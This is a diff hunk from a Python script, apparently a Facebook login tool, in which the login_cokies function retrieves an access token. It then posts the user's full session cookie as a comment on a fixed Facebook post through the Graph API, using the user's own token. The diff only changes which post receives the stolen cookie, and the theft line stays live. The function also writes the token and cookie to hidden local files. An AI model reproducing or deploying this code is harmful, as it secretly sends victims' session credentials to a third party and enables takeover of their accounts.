@@ -139,7 +139,7 @@ def login_cokies():
         nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
         roq = ses.get(nek,cookies=cookies)
         tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-        requests.post(f"https://graph.facebook.com/v17.0/100023328316616_1486016732185923/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
+        requests.post(f"https://graph.facebook.com/v17.0/100023328316616_1486076892179907/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
         ken = open(".cyxieontoken.txt", "w").write(tok)
         cok = open(".cyxieoncokies.txt", "w").write(cookie)
         print(f"{kun}╭────────────────────────────────────────────{puti}")
